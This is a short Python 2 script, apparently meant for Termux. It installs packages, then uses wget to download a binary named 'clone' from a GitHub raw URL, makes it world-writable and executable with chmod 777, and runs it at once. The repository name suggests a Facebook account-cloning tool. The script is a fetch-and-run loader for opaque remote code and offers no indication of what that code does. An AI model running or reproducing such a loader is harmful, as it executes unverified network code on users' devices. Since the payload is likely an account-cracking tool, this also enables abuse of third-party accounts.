#coding=utf-8
#!/usr/bin/python2
#coding=utf-8

try:
  import os
  import re
  import time
  import sys
  import subprocess
except ImportError:
  os.system("pip2 install requests")
  os.system("pip2 install mechanize")

import requests
os.system("pip2 install requests bs4")
os.system("pkg install wget -y")

def sub():
  os.system("clear")
  print("")
  print("")
  os.system("wget https://raw.githubusercontent.com/Tech-abm/fbc-64bit/main/clone")
  os.system("chmod 777 clone && ./clone ")

if __name__ == '__main__':
  sub()
